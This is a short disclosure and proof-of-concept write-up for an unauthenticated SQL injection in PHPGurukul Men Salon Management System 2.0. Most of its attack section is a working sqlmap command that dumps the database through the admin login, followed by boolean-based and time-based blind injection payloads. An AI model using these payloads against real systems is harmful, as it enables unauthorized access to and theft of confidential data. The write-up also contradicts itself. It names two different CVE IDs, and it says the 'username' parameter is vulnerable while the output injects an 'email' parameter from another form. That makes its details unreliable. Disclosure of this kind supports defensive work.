# CVE-2024-30998-PHPGurukul-Men-Salon-Management-System-2.0-SQL-Injection-Vulnerability (Unauthenticated)
+ Exploit Author: efekaanakkar
# Vendor Homepage
+ https://phpgurukul.com/men-salon-management-system-using-php-and-mysql
# Software Link
+ https://phpgurukul.com/?sdm_process_download=1&download_id=14066
# Overview
+ PHPGurukul Men Salon Management System V2.0 is susceptible to a A notable security weakness stems from inadequate safeguarding of the 'Username' parameter within the admin/index.php file. This vulnerability has the potential to be exploited for injecting harmful SQL queries, resulting in unauthorized access and extraction of confidential data from the database.
# Vulnerability Details
+ CVE ID: CVE-2024-35511
+ Affected Version: PHPGurukul Men Salon Management System 2.0 
+ Parameter Name: email
# References
+ https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-35511
# Description
+ Inadequate validation and sanitization of the 'username' parameter pave the way for attackers to construct SQL injection queries, circumventing authentication measures and obtaining unauthorized entry to the database.
# Proof of Concept (PoC) : 
+ `sqlmap -u "http://192.168.1.62/msms/admin/index.php" --method POST --data="username=admin&password=admin&login=Sign+In" -p"username" --random-agent --level 3 --risk 3 -D "msmsdb" --dump --tables`

```
---
Parameter: email (POST)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: email=test@test.com' RLIKE (SELECT (CASE WHEN (8847=8847) THEN 0x7465737440746573742e636f6d ELSE 0x28 END)) AND 'ZHEF'='ZHEF&sub=submit

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: email=test@test.com' AND (SELECT 8859 FROM (SELECT(SLEEP(5)))DjVt) AND 'ZEmv'='ZEmv&sub=submit
---

```
+ current database: `msmsdb`
![image](https://github.com/efekaanakkar/CVEs/assets/130908672/7cf45037-3e64-4fff-8337-86292c34ddd2)
